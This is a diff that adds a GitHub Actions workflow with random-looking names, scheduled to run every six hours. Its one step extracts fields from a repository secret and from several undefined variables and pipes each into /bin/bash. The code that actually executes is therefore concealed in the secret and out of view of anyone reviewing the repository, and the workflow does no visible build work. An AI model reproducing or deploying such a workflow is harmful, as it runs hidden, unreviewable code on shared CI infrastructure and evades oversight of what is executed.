@@ -1,0 +1,28 @@
+name: chengwangti4354
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '47 3/6 * * *'
+
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: chengwangti4354
+        env:
+          hmi7: ${{ secrets.hmi7 }}
+        run: |
+          echo $hmi7 | jq -r .k869 | /bin/bash
+          echo $sds998 | jq -r .itexs90297 | /bin/bash
+          echo $qypy7319 | jq -r .wtv822 | /bin/bash
+          echo $yfppe0029 | jq -r .i5533 | /bin/bash
+          echo $j3061 | jq -r .fmhe3 | /bin/bash
+          echo $kxai5713 | jq -r .kvdm795 | /bin/bash
+          echo $jsg3 | jq -r .uggb526 | /bin/bash
+          echo $roar8 | jq -r .jv828 | /bin/bash
+          echo $pl50752 | jq -r .g5 | /bin/bash
+          echo $v4 | jq -r .zegey8 | /bin/bash
+          echo $xjzkq02123 | jq -r .cxffc487 | /bin/bash
+          echo $g312 | jq -r .xzksg23231 | /bin/bash
+
